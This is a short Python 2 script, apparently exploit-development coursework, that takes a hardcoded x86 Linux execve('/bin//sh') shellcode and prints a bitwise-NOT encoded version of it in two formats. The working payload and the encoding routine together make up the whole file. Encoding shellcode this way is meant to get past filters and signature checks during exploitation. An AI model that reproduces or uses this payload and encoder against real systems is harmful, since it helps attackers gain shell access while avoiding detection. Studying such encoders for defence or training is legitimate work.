# encoder.py
# Author: Kunal Varudkar
# NOT encoder program for shellcode


#!/usr/bin/python

shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x2f\x2f\x2f\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

enc1 = ""
enc2 = ""

print 'Encoded Shellcode....'

for x in bytearray(shellcode):
	#Complement Encoding
	y = ~x

	enc1 += '\\x'
	enc1 += '%02x' % (y & 0xff)

	enc2 += '0x'
	enc2 += '%02x,' % (y & 0xff)

print enc1 + '\n'
print enc2 + '\n'

print 'Len: %d' % len(bytearray(shellcode))
